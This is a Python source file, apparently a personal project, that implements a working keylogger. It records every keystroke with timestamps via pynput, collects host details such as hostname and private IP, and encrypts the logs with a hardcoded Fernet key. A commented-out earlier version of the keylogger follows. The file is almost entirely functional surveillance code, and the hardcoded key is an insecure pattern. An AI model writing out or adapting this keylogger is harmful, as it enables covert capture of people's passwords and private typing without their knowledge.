import platform
import logging
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import time
import socket

# 1a .txt file for actual information
keys_information = "keylog.txt" #this is where logs will be stored- txt file
sys_information = "sysinfo.txt" #this is where system info is stored

# 1b .txt files for encrypted info
keys_information_e = "e_keylog.txt" #encrypted file keys
sys_information_e = "e_sysinfo.txt" #encrypted file sys info

# 1c. key for encryption and decryption
key= "m6wOmergiho1Ay8egx8wR98qqYHsK7ZU9LFpq-hgajo=" #this key is generated from encryptionkey.txt
# note maybe i can open that file and read the contents and set it to key instead of manually pasting it next time..

# 1d. file path for local machine
file_path = "C:\\Users\\shukf\\Documents\\Project\\keyloggerProj"  #path
extend = "\\" #this is where the file text will go --> D:\PyProjects\Project\keylogger.txt
file_merge = (file_path + extend) #combines file path and extension 

# 1e. file paths for normal .txt and encrpypted txt
files_to_encrypt = [file_merge + keys_information, file_merge + sys_information] #for now, just encrypting keylog txt --> this is the path regular file located
encryped_file_names = [file_merge + keys_information_e, file_merge + sys_information_e] #encrypted name --> path that encrypted file is located

# 2. configuring logging
#logging.basicConfig configures the logging system | keylog.txt is where logs wil be written |"INFO" is there to confirm things are working | format into timestamp and message 
logging.basicConfig(filename="keylog.txt", level=logging.INFO, format="%(asctime)s %(message)s")
logger = logging.getLogger()


# 3. getting system information
def system_information():
    with open(file_path + extend + sys_information, "a") as f: #opening up sysinfo.txt file and appending
        hostname = socket.gethostname() #getting host name
        IPadd = socket.gethostbyname(hostname) #ip address of host 
        f.write(f"Procesor: {platform.processor()}\n") #processor info (i.e. Intel)
        f.write(f"System: {platform.system()}, Version: {platform.version()}\n") #sys info (i.e. OS) + version info 
        f.write(f"Machine: {platform.machine()}\n") #machine (i.e. AMD64)
        f.write(f"Host Name: {hostname}\n") #hostname (i.e. This-PC)
        f.write(f"Private IP Address: {IPadd}\n---------------------------") 
system_information()


# 4. keylogger
count = 0
keys = [] #list to store keys
def on_press(key):
    global keys, count
    print(key) #printing whatever typed into terminal (not necessary but can be useful)
    keys.append(key) #adding keys to key list
    count+=1 #increasing count after appending

    #organizing keylog.txt file
    if count >= 1: #recording characters, one at a time (i.e. c h a r instead of char)
        count = 0 #reset count to 0 so able to record every char
        write_file(keys) #write list keys to keylog.txt file
        keys = []   #create empty key list


# 5. printing to txt file w/ timestamp (keylogger)
def write_file(keys):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")  #add timestamp

    try:
        with open(file_path+extend+keys_information,"a") as f: #opening the file from file path
            for key in keys:
                k = str(key).replace("'", "") #replacing '' with nothing, so it would be h instead of 'h'
               
                if k.find("space") > 0:  #every time spacebar entered, newline created
                    f.write('\n')
                elif k.find("Key")==-1:  #checking values of each key
                    f.write(f"[{timestamp}] {k}\n") #including time stamp along with log
            f.close()        
            
    except Exception as e:
        logger.error(f"There was an error writing to file: {e}")


# 6. exiting and recording keys
def on_release(key):
    if key == Key.esc: #exit keylogger when esc is pressed
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# 7. encryption and decryption
count = 0
for encrypted_file in files_to_encrypt:
    #read
    with open(files_to_encrypt[count], 'rb') as f: #open files in binary
        data = f.read()

    #encrypt
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data) #encrypting data w/ Fernet
    
    #append
    with open (encryped_file_names[count], 'wb') as f: #appending encrypted data, writing binary
        f.write(encrypted) #writing encrypted data

    count+=1 #increasing count.. i know it's just 2 items for now

"""from pynput import keyboard
import logging
import time

#this works on my local pc..

def keyPressed(key):
    print(str(key)) #converting to string for us to see
    
    #appending to text file:
    with open("keylogs.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed) 
    listener.start() #starts listener
    input()  #getting input
"""

